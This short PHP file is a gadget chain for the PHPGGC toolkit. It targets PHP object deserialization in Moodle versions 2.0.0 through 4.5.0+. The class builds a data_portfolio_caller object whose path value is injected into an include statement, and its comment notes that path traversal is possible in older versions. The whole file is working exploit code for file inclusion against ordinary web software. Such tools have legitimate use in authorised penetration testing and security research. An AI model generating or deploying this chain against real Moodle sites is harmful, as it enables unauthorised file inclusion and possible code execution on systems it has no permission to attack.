<?php

namespace GadgetChain\Moodle;

class FI1 extends \PHPGGC\GadgetChain\FileInclude
{
    public static $version = '2.0.0 <= 4.5.0+';
    public static $vector = '__wakeup';
    public static $author = 'mcdruid';
    public static $information = 'Moodle\'s class loading is "quirky" so classes
    are not always available. This Gadget Chain exploits the following path:
    $CFG->dirroot . \'/mod/data/field/\' . $field .\'/field.class.php\'
    ..where the specified value will be injected into $field. Path traversal is
    possible, but later versions of moodle check the path with file_exists().';

    public function generate(array $parameters)
    {
        return new \data_portfolio_caller($parameters['remote_path']);
    }
}
